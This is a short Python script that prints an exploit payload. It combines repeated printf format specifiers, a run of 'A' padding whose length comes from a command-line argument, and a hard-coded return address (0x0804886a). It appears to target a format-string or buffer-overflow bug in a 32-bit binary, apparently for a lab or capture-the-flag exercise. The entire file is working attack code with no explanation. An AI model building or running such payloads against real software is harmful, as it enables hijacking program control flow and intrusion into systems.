import sys
string =  "%01x. %01x. %01x. %01x. %01x. %01x. %01x. %01x. %01x. %01x. "
string += 'A'*int(sys.argv[1])
#0804886a
string+="\x08\x04\x88\x6a"

print(string)

#0x8048